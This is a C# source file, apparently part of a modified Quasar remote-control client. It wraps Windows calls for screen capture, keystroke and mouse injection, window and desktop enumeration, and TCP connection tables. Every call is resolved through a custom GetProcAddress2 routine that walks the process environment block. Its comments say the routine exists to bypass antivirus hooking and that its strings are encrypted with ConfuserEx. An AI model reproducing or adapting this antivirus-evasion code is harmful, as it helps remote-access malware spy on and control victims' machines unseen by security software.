using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    public static class ClientNatives
    {
        // delegates
        //[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate IntPtr LoadLibraryFunc([MarshalAs(UnmanagedType.LPWStr)] string lpFileName);
        internal static IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPWStr)] string lpFileName) => GetProcAddress2<LoadLibraryFunc>("kernel32.dll", "LoadLibraryW")(lpFileName);

        //[DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool FreeLibraryFunc(IntPtr hModule);

        internal static bool FreeLibrary(IntPtr hModule) => GetProcAddress2<FreeLibraryFunc>("kernel32.dll", "FreeLibrary")(hModule);

        //[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        //internal delegate IntPtr GetProcAddressFunc(IntPtr hModule, string procName);

        //[DllImport("kernel32.dll", SetLastError = true)]
        internal delegate bool QueryFullProcessImageNameFunc([In] IntPtr hProcess, [In] uint dwFlags, [Out] StringBuilder lpExeName, [In, Out] ref uint lpdwSize);
        internal static bool QueryFullProcessImageName(IntPtr hProcess, uint dwFlags, StringBuilder lpExeName, ref uint lpdwSize) => GetProcAddress2<QueryFullProcessImageNameFunc>("kernel32.dll", "QueryFullProcessImageName")(hProcess, dwFlags, lpExeName, ref lpdwSize);

        /// <summary>
        ///    Performs a bit-block transfer of the color data corresponding to a
        ///    rectangle of pixels from the specified source device context into
        ///    a destination device context.
        /// </summary>
        /// <param name="hdc">Handle to the destination device context.</param>
        /// <param name="nXDest">The leftmost x-coordinate of the destination rectangle (in pixels).</param>
        /// <param name="nYDest">The topmost y-coordinate of the destination rectangle (in pixels).</param>
        /// <param name="nWidth">The width of the source and destination rectangles (in pixels).</param>
        /// <param name="nHeight">The height of the source and the destination rectangles (in pixels).</param>
        /// <param name="hdcSrc">Handle to the source device context.</param>
        /// <param name="nXSrc">The leftmost x-coordinate of the source rectangle (in pixels).</param>
        /// <param name="nYSrc">The topmost y-coordinate of the source rectangle (in pixels).</param>
        /// <param name="dwRop">A raster-operation code.</param>
        /// <returns>
        ///    <c>true</c> if the operation succeedes, <c>false</c> otherwise. To get extended error information, call <see cref="System.Runtime.InteropServices.Marshal.GetLastWin32Error"/>.
        /// </returns>
        //[DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool BitBltFunc([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        internal static bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop) => GetProcAddress2<BitBltFunc>("gdi32.dll", "BitBlt")(hdc, nXDest, nYDest, nWidth, nHeight, hdcSrc, nXSrc, nYSrc, dwRop);

        //[DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
        internal delegate IntPtr CreateDCFunc([MarshalAs(UnmanagedType.LPWStr)] string lpszDriver, [MarshalAs(UnmanagedType.LPWStr)] string lpszDevice, [MarshalAs(UnmanagedType.LPWStr)] string lpszOutput, IntPtr lpInitData);
        internal static IntPtr CreateDC([MarshalAs(UnmanagedType.LPWStr)] string lpszDriver, [MarshalAs(UnmanagedType.LPWStr)] string lpszDevice, [MarshalAs(UnmanagedType.LPWStr)] string lpszOutput, IntPtr lpInitData) => GetProcAddress2<CreateDCFunc>("gdi32.dll", "CreateDCW")(lpszDriver, lpszDevice, lpszOutput, lpInitData);

        //[DllImport("gdi32.dll")]
        internal delegate bool DeleteDCFunc([In] IntPtr hdc);
        internal static bool DeleteDC(IntPtr hdc) => GetProcAddress2<DeleteDCFunc>("gdi32.dll", "DeleteDC")(hdc);

        //[DllImport("user32.dll")]
        internal delegate bool GetLastInputInfoFunc(ref LASTINPUTINFO plii);
        internal static bool GetLastInputInfo(ref LASTINPUTINFO plii) => GetProcAddress2<GetLastInputInfoFunc>("user32.dll", "GetLastInputInfo")(ref plii);

        //[DllImport("user32.dll")]
        internal delegate bool SetCursorPosFunc(int x, int y);
        internal static bool SetCursorPos(int x, int y) => GetProcAddress2<SetCursorPosFunc>("user32.dll", "SetCursorPos")(x, y);

        //[DllImport("user32.dll", SetLastError = false)]
        internal delegate IntPtr GetMessageExtraInfoFunc();
        internal static IntPtr GetMessageExtraInfo() => GetProcAddress2<GetMessageExtraInfoFunc>("user32.dll", "GetMessageExtraInfo")();

        /// <summary>
        /// Synthesizes keystrokes, mouse motions, and button clicks.
        /// </summary>
        //[DllImport("user32.dll")]
        internal delegate uint SendInputFunc(uint nInputs, [MarshalAs(UnmanagedType.LPArray), In] INPUT[] pInputs, int cbSize);
        internal static uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize) => GetProcAddress2<SendInputFunc>("user32.dll", "SendInput")(nInputs, pInputs, cbSize);

        //[DllImport("user32.dll")]
        internal delegate bool SystemParametersInfoFunc(uint uAction, uint uParam, ref IntPtr lpvParam, uint flags);
        internal static bool SystemParametersInfo(uint uAction, uint uParam, ref IntPtr lpvParam, uint flags) => GetProcAddress2<SystemParametersInfoFunc>("user32.dll", "SystemParametersInfoW")(uAction, uParam, ref lpvParam, flags);

        //[DllImport("user32.dll")]
        internal delegate int PostMessageFunc(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);
        internal static int PostMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam) => GetProcAddress2<PostMessageFunc>("user32.dll", "PostMessage")(hWnd, wMsg, wParam, lParam);

        //[DllImport("user32.dll", CharSet = CharSet.Unicode)]
        internal delegate IntPtr OpenDesktopFunc([MarshalAs(UnmanagedType.LPWStr)] string hDesktop, int flags, bool inherit, uint desiredAccess);
        internal static IntPtr OpenDesktop([MarshalAs(UnmanagedType.LPWStr)] string hDesktop, int flags, bool inherit, uint desiredAccess) => GetProcAddress2<OpenDesktopFunc>("user32.dll", "OpenDesktopW")(hDesktop, flags, inherit, desiredAccess);

        //[DllImport("user32.dll")]
        internal delegate bool CloseDesktopFunc(IntPtr hDesktop);
        internal static bool CloseDesktop(IntPtr hDesktop) => GetProcAddress2<CloseDesktopFunc>("user32.dll", "CloseDesktop")(hDesktop);

        //[DllImport("user32.dll")]
        internal delegate bool EnumDesktopWindowsFunc(IntPtr hDesktop, EnumDesktopWindowsProc callback, IntPtr lParam);
        internal static bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc callback, IntPtr lParam) => GetProcAddress2<EnumDesktopWindowsFunc>("user32.dll", "EnumDesktopWindows")(hDesktop, callback
            , lParam);

        //[DllImport("user32.dll")]
        internal delegate bool IsWindowVisibleFunc(IntPtr hWnd);
        internal static bool IsWindowVisible(IntPtr hWnd) => GetProcAddress2<IsWindowVisibleFunc>("user32.dll", "IsWindowVisible")(hWnd);

        //[DllImport("user32.dll")]
        internal delegate IntPtr GetForegroundWindowFunc();
        internal static IntPtr GetForegroundWindow() => GetProcAddress2<GetForegroundWindowFunc>("user32.dll", "GetForegroundWindow")();

        //[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate int GetWindowTextFunc(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount);
        internal static int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpString, int nMaxCount) => GetProcAddress2<GetWindowTextFunc>("user32.dll", "GetWindowTextW")(hWnd, lpString, nMaxCount);

        //[DllImport("iphlpapi.dll", SetLastError = true)]
        internal delegate uint GetExtendedTcpTableFunc(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TcpTableClass tblClass, uint reserved);
        internal static uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TcpTableClass tblClass, uint reserved = 0) => GetProcAddress2<GetExtendedTcpTableFunc>("iphlpapi.dll", "GetExtendedTcpTable")(pTcpTable, ref dwOutBufLen, sort, ipVersion, tblClass, reserved);

        //[DllImport("iphlpapi.dll")]
        internal delegate int SetTcpEntryFunc(IntPtr pTcprow);
        internal static int SetTcpEntry(IntPtr pTcprow) => GetProcAddress2<SetTcpEntryFunc>("iphlpapi.dll", "SetTcpEntry")(pTcprow);

        // structs
        internal delegate bool EnumDesktopWindowsProc(IntPtr hDesktop, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        internal struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
            [MarshalAs(UnmanagedType.U4)] public UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct INPUT
        {
            internal uint type;
            internal InputUnion u;
            internal static int Size => Marshal.SizeOf(typeof(INPUT));
        }

        [StructLayout(LayoutKind.Explicit)]
        internal struct InputUnion
        {
            [FieldOffset(0)]
            internal MOUSEINPUT mi;
            [FieldOffset(0)]
            internal KEYBDINPUT ki;
            [FieldOffset(0)]
            internal HARDWAREINPUT hi;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct MOUSEINPUT
        {
            internal int dx;
            internal int dy;
            internal int mouseData;
            internal uint dwFlags;
            internal uint time;
            internal IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct KEYBDINPUT
        {
            internal ushort wVk;
            internal ushort wScan;
            internal uint dwFlags;
            internal uint time;
            internal IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct HARDWAREINPUT
        {
            public uint uMsg;
            public ushort wParamL;
            public ushort wParamH;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct MibTcprowOwnerPid
        {
            public uint state;
            public uint localAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] localPort;
            public uint remoteAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public byte[] remotePort;
            public uint owningPid;
            public IPAddress LocalAddress
            {
                get { return new IPAddress(localAddr); }
            }

            public ushort LocalPort
            {
                get { return BitConverter.ToUInt16(new byte[2] { localPort[1], localPort[0] }, 0); }
            }

            public IPAddress RemoteAddress
            {
                get { return new IPAddress(remoteAddr); }
            }

            public ushort RemotePort
            {
                get { return BitConverter.ToUInt16(new byte[2] { remotePort[1], remotePort[0] }, 0); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct MibTcptableOwnerPid
        {
            public uint dwNumEntries;
            private readonly MibTcprowOwnerPid table;
        }

        internal enum TcpTableClass
        {
            TcpTableBasicListener,
            TcpTableBasicConnections,
            TcpTableBasicAll,
            TcpTableOwnerPidListener,
            TcpTableOwnerPidConnections,
            TcpTableOwnerPidAll,
            TcpTableOwnerModuleListener,
            TcpTableOwnerModuleConnections,
            TcpTableOwnerModuleAll
        }

        private static Dictionary<int, IntPtr> addresses = new Dictionary<int, IntPtr>();

        internal static void LoadNatives()
        {
            LoadLibrary("user32.dll");
            LoadLibrary("gdi32.dll");
            LoadLibrary("iphlpapi.dll");
        }

        // Self-implemented GetProcAddress (bypass Antivirus GetProcAddress hooking)
        // 고마워요, 정성태님!
        //https://www.sysnet.pe.kr/2/0/12101
        internal static T GetProcAddress2<T>(string module, string proc) // NOTE: The strings will be automatically encrypted using ConfuserEx
        {
            var key = (module + '!' + proc).GetHashCode(); // Address caching
            if (!addresses.TryGetValue(key, out var addr))
            {
                var peb = EnvironmentBlockInfo.GetPeb();
                var ldrData = _PEB_LDR_DATA.Create(peb.Ldr);
                var mod = ldrData.Find(module);
                if (object.Equals(mod, default(_LDR_DATA_TABLE_ENTRY)))
                    Environment.FailFast("Inexistent module: " + module);
                var img = PEImage.ReadFromMemory(mod.DllBase, (int)mod.SizeOfImage);
                var procStr = img.GetExportFunction(proc);
                if (object.Equals(procStr, default(ExportFunctionInfo)))
                    Environment.FailFast("Inexistent proc: " + proc);
                addr = (IntPtr)((ulong)mod.DllBase + procStr.RvaAddress);
                addresses.Add(key, addr);
            }
            return Marshal.GetDelegateForFunctionPointer<T>(addr);
        }
    }
}
